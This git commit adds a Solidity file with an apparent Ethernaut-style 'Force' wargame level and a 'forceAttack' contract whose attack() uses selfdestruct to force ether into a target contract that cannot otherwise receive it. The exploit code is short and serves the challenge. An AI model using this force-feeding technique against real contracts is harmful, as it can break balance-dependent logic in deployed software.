1c7ddd803863d6c10b4fb771ed2b69fadc75f3fd
mr-abims <adebayoabimbola9@gmail.com>
2023-01-31 23:41:31 +0100

    force

---
+++ force.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+
+contract forceAttack {
+    address target;
+   
+    constructor (address  _target) payable {
+        target = _target;
+    }
+    
+        
+    function attack() public{
+        selfdestruct (payable (target));
+    }
+    function balance() public  view  returns (uint) {
+        return address(this).balance;
+    }
+}
